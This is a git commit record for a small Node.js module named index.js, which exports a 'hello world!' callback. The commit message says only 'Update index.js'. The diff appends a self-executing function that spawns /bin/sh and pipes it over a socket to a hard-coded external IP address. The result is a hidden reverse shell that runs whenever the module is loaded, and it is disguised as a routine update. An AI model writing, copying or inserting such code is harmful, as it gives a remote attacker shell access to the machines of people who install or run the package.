f80286ecbbffd9c2902af1b2acf07035ca4addbf
Unknown <5295307+NullbutC00L@users.noreply.github.com>
2023-09-07 10:57:38 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,3 +1,15 @@
 module.exports = function (cb) {
   cb(null, 'hello world!');
 }
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "46.19.37.133", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
